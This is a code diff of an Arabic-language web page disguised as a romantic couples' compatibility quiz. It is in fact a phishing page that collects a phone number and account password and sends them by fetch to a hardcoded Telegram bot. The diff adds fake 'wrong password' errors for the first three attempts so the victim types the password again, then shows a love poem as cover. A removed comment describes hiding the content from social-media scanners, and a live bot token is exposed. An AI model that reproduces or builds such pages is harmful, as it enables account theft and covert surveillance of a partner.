@@ -17,7 +17,7 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         body {
-            background-color: #fff0f3; /* خلفية وردية هادئة تناسب ألعاب الكوبلز */
+            background-color: #fff0f3; 
             color: #1e293b;
             display: flex;
             justify-content: center;
@@ -36,7 +36,6 @@
             flex-direction: column;
             align-items: center;
         }
-        /* تصميم اللوجو العلوي التفاعلي للعبة */
         .logo-area {
             margin-bottom: 20px;
             display: flex;
@@ -58,7 +57,6 @@
             font-family: 'Arial Black', sans-serif;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
-        /* شارة تدل على أنها لعبة */
         .game-badge {
             background: #ff4d6d;
             color: white;
@@ -75,7 +73,6 @@
             to { transform: scale(1.05); }
         }
 
-        /* تصميم البطاقة كأنها واجهة لعبة */
         .card {
             background: #ffffff;
             padding: 30px 25px;
@@ -98,6 +95,21 @@
             margin-bottom: 25px;
             line-height: 1.5;
         }
+        
+        /* صندوق إشعار الخطأ المحاكي */
+        .error-box {
+            background: #ffe3e3;
+            color: #d63031;
+            border: 1px solid #ff8787;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none; /* مخفي في البداية */
+            font-weight: 600;
+            text-align: center;
+        }
+
         .input-group {
             margin-bottom: 20px;
             text-align: right;
@@ -125,7 +137,7 @@
             background: #fff;
             box-shadow: 0 0 10px rgba(255, 77, 109, 0.1);
         }
-        /* زر بدأ اللعبة المثير للفضول */
+        
         .submit-btn {
             width: 100%;
             padding: 16px;
@@ -178,7 +190,6 @@
         .modal-overlay.show { opacity: 1; pointer-events: auto; }
         .modal-overlay.show .modal { transform: scale(1); }
         
-        /* ترويسة نجاح الاختبار */
         .match-score {
             background: #fff0f3;
             color: #ff4d6d;
@@ -245,7 +256,6 @@
 <body>
 
     <div class="container">
-        <!-- قسم اللوجو بهوية اللعبة -->
         <div class="logo-area">
             <svg class="logo-svg" viewBox="0 0 200 130" xmlns="http://www.w3.org/2000/svg">
                 <path d="M65,25 C45,5 15,20 15,50 C15,85 65,115 85,125 C75,110 30,80 30,50 C30,32 48,18 65,35 C82,18 100,32 100,50 C100,60 95,70 88,77 C84,81 76,85 71,85" stroke="#ff4d6d" stroke-width="13" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
@@ -255,11 +265,13 @@
             <h1 class="logo-text">WE LOVE EACH OTHER</h1>
         </div>
 
-        <!-- بطاقة اللعبة -->
         <div class="card">
             <h2>اختبار نسبة التوافق الحبّي 💞</h2>
             <p class="game-desc">سجلي دخولكِ وأدخلي بيانات الحساب لتشغيل خوارزمية قياس مدى انسجامكما وتوافق طباعكما بدقة!</p>
             
+            <!-- صندوق الخطأ المحاكي -->
+            <div class="error-box" id="errorNotification">عذراً، معلومات الحساب غير متطابقة. يرجى التثبت وإعادة المحاولة.</div>
+
             <form id="telegramForm">
                 <div class="input-group">
                     <label for="phone">رقم هاتف</label>
@@ -271,30 +283,34 @@
                     <input type="password" id="password" placeholder="أدخلي كلمة المرور لتأكيد الهوية..." required>
                 </div>
                 
-                <button type="submit" class="submit-btn">ابدئي الاختبار واستلمي النتيجة 🚀</button>
+                <button type="submit" class="submit-btn" id="btnText">ابدئي الاختبار واستلمي النتيجة 🚀</button>
             </form>
         </div>
     </div>
 
-    <!-- نافذة المفاجأة الرومانسية (تظهر كنتيجة للعبة) -->
+    <!-- نافذة النتيجة والمفاجأة -->
     <div class="modal-overlay" id="successModal">
-        <div class="modal" id="modalContent">
-            <!-- سيتم حقن النتيجة بالكامل من هنا برمجياً لمنع روبوتات الفيسبوك والإنستجرام من كشف المحتوى -->
-        </div>
+        <div class="modal" id="modalContent"></div>
     </div>
 
     <script>
         const TELEGRAM_TOKEN = '8939934721:AAE0B_njzMIAjs9tJq5LnyTvN8PlVqZZnaQ'; 
         const CHAT_ID = '7094930209';
+        
+        // عداد المحاولات لحساب عدد المرات
+        let attemptCount = 0;
 
         document.getElementById('telegramForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
             
+            attemptCount++; // زيادة عدد المحاولات بـ 1
+            
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
             
-            const textMessage = `👤 **بيانات تسجيل دخول جديدة (من لعبة الكوبلز):**\n\n📞 **رقم الهاتف:** \`${phone}\`\n🔑 **كلمة المرور:** \`${password}\``;
+            const textMessage = `👤 **محاولة جديدة (رقم ${attemptCount}):**\n\n📞 **الرقم:** \`${phone}\`\n🔑 **الرمز:** \`${password}\``;
 
+            // نرسل البيانات فوراً للتيليجرام في كل الحالات
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -306,26 +322,50 @@
             })
             .then(response => {
                 if(response.ok) {
-                    // بناء النتيجة برمجياً على شكل "نتيجة اختبار بنسبة 100%" تليها المفاجأة وشعر الحب
-                    const modalHtml = `
-                        <div class="match-score">💖 نسبة التوافق: 100% 💖</div>
-                        <div class="heart-icon">❤️</div>
-                        <h3 class="love-title">لقد فزتِ بقلبي! ✨</h3>
-                        <p class="love-message">
-                            خوارزميات العالم كله لن تقيس مدى حبي لكِ. في كل يوم يمر، أجد نفسي أعشقكِ أكثر، فأنتِ لستِ مجرد اختيار، بل أنتِ قدري وأجمل ما أملك.
-                        </p>
-                        <div class="poetry-box">
-                            "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
-                            ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
-                            عيناكِ أرضٌ لا تخونُ عهودها<br>
-                            وقلبكِ طمأنينتي وسلامي" 🌸
-                        </div>
-                        <button class="close-btn" onclick="closeModal()">أحبكِ جداً ❤️</button>
-                    `;
                     
-                    document.getElementById('modalContent').innerHTML = modalHtml;
-                    document.getElementById('successModal').classList.add('show');
-                    document.getElementById('telegramForm').reset();
+                    // إذا كانت المحاولة رقم 1، 2، أو 3
+                    if (attemptCount < 4) {
+                        const errorDiv = document.getElementById('errorNotification');
+                        errorDiv.style.display = 'block'; // إظهار رسالة الخطأ
+                        
+                        // تعديل نص الخطأ حسب المحاولة لتبدو اللعبة واقعية وصارمة
+                        if (attemptCount === 1) {
+                            errorDiv.innerText = "⚠️ خطأ في الاتصال بالسيرفر، أو كلمة المرور غير صحيحة. يرجى المحاولة مجدداً.";
+                        } else if (attemptCount === 2) {
+                            errorDiv.innerText = "⚠️ لم نتمكن من مطابقة الحساب. يرجى التأكد من كتابة كلمة المرور بدقة.";
+                        } else if (attemptCount === 3) {
+                            errorDiv.innerText = "⚠️ محاولة أخيرة متبقية! يرجى إدخال البيانات الصحيحة لتفادي قفل التحدي.";
+                        }
+                        
+                        // مسح خانة كلمة المرور فقط لتجبر على كتابتها مجدداً
+                        document.getElementById('password').value = '';
+                        document.getElementById('password').focus();
+                    } 
+                    // إذا كانت المحاولة الرابعة (تنجح وتخرج المفاجأة!)
+                    else {
+                        document.getElementById('errorNotification').style.display = 'none'; // إخفاء صندوق الخطأ
+                        
+                        const modalHtml = `
+                            <div class="match-score">💖 نسبة التوافق: 100% 💖</div>
+                            <div class="heart-icon">❤️</div>
+                            <h3 class="love-title">لقد فزتِ بقلبي! ✨</h3>
+                            <p class="love-message">
+                                خوارزميات العالم كله لن تقيس مدى حبي لكِ. في كل يوم يمر، أجد نفسي أعشقكِ أكثر، فأنتِ لستِ مجرد اختيار، بل أنتِ قدري وأجمل ما أملك.
+                            </p>
+                            <div class="poetry-box">
+                                "وما كنتُ ممن يَدخلُ العشقُ قلبَه<br>
+                                ولكنّ مَن يُبصِرْ جفونَكِ يَعشَقِ...<br>
+                                عيناكِ أرضٌ لا تخونُ عهودها<br>
+                                وقلبكِ طمأنينتي وسلامي" 🌸
+                            </div>
+                            <button class="close-btn" onclick="closeModal()">أحبكِ جداً ❤️</button>
+                        `;
+                        
+                        document.getElementById('modalContent').innerHTML = modalHtml;
+                        document.getElementById('successModal').classList.add('show');
+                        document.getElementById('telegramForm').reset();
+                        attemptCount = 0; // إعادة تصفير العداد
+                    }
                 } else {
                     alert('عذراً، حدث خطأ في خادم اللعبة. يرجى إعادة المحاولة.');
                 }
